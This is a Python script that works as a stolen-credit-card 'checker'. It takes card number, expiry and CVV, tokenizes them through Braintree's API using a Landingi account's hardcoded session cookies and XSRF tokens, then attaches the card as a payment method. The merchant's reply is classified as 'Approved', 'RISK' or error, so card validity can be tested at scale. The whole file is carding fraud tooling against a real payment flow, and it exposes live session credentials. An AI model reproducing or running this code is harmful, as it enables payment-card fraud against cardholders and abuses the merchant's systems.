import requests
import re
import base64

def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def chk(card):
    import requests, re, base64, random, string, user_agent, time
    from requests_toolbelt.multipart.encoder import MultipartEncoder
    from requests.packages.urllib3.exceptions import InsecureRequestWarning

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

    card = card.strip()
    parts = re.split('[|/:]', card)
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]

    if "20" in yy:
        yy = yy.split("20")[1]

    r = requests.session()



    cookies = {
    'PHPSESSID_APPLICATION': '964jfjv9v16vcgr5moehnd789fnhr56h',
    'referer': 'https://app.landingi.com/',
    '_gcl_au': '1.1.1211849239.1743523861',
    'gtmReferrer': '',
    'landingi_uid': '360643',
    'landingi_token': 'abf9f45eb69672b885cb9f119bc5df81',
    'PHPLANDINGIAPPSESSID': 'n05277apdg5gbjvrvsi89hb9o7',
    '_uetsid': 'e86d4e600f1311f0827d63c412731859',
    '_uetvid': 'e86e00a00f1311f0be18e766cba8dc82',
}

    headers = {
    'authority': 'app.landingi.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ar-EG,ar;q=0.9',
    'baggage': 'sentry-environment=production,sentry-release=59061d415f4fb49ee505da6ac309d91b6ed2636a,sentry-public_key=554db9e614674fbf988cc5b4d2854cd1,sentry-trace_id=fb5251b5e22742bf8c019267b59da0ba,sentry-sample_rate=0.25,sentry-transaction=%2F%2Fcredit-card-step,sentry-sampled=false',
    'origin': 'https://app.landingi.com',
    'referer': 'https://app.landingi.com/credit-card-step?lang=en&period=1',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sentry-trace': 'fb5251b5e22742bf8c019267b59da0ba-bcbe0d3edf8af7f3-0',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-xsrf-token': 'e37cc78cbafe981575.cQQk1U6fGUXOErSn0htWE6Mxghyf6hqKfyOAkCh2f8A.Bmp7pSXXWhG7IfbJmkxgKtRd-k_4vVO7IHbJ_UoDLLoyYUeTG8pBPa8k-Q',
}

    json_data = {}

    response = requests.post(
    'https://app.landingi.com/api/payments/create-braintree-token',
    cookies=cookies,
    headers=headers,
    json=json_data,
)
 
    enc = response.json()['token']
 
    dec = base64.b64decode(enc).decode('utf-8')
 
    au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
 




    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://app.landingi.com',
    'referer': 'https://app.landingi.com/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'ef4795cb-fdb6-4805-a2f7-c78f90bfcf03',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': True,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)


 
    tok = response.json()['data']['tokenizeCreditCard']['token']
 





    cookies = {
    'PHPSESSID_APPLICATION': '964jfjv9v16vcgr5moehnd789fnhr56h',
    'referer': 'https://app.landingi.com/',
    '_gcl_au': '1.1.1211849239.1743523861',
    'gtmReferrer': '',
    'landingi_uid': '360643',
    'landingi_token': 'abf9f45eb69672b885cb9f119bc5df81',
    'PHPLANDINGIAPPSESSID': 'n05277apdg5gbjvrvsi89hb9o7',
    '_uetsid': 'e86d4e600f1311f0827d63c412731859',
    '_uetvid': 'e86e00a00f1311f0be18e766cba8dc82',
}

    headers = {
    'authority': 'app.landingi.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'ar-EG,ar;q=0.9',
    'baggage': 'sentry-environment=production,sentry-release=59061d415f4fb49ee505da6ac309d91b6ed2636a,sentry-public_key=554db9e614674fbf988cc5b4d2854cd1,sentry-trace_id=fb5251b5e22742bf8c019267b59da0ba,sentry-sample_rate=0.25,sentry-transaction=%2F%2Fcredit-card-step,sentry-sampled=false',
    'content-type': 'application/json',
    'origin': 'https://app.landingi.com',
    'referer': 'https://app.landingi.com/credit-card-step?lang=en&period=1',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sentry-trace': 'fb5251b5e22742bf8c019267b59da0ba-bcbe0d3edf8af7f3-0',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'x-xsrf-token': '4bdf72c6ea4cffaffa.kQ9TxEb919Y0NOFCbM9iN6vb4_44wJCzxc_JPSF_xb4.5mEMtC21lIJBB6MsJJhUDty3m61fl9mCmpqAUEMKlsTSajCCE6iPrlUCrA',
}
    
    json_data = {
    'nonce': tok,
}

    response = requests.post('https://app.landingi.com/api/payments/payment-methods', cookies=cookies, headers=headers, json=json_data)


    text = response.text
    pattern = r'"message":"(.*?)"'

    match = re.search(pattern, text)
    if match:
        result = match.group(1)
        if 'risk_threshold' in text:
            result = "RISK: Retry this BIN later."
    else:
        if '"token":"' in text:  # التحقق مما إذا كان هناك توكن بدلاً من رسالة خطأ
            result = "1000: Approved"
        elif 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
            result = "1000: Approved"
        else:
            result = "Error"

    return result
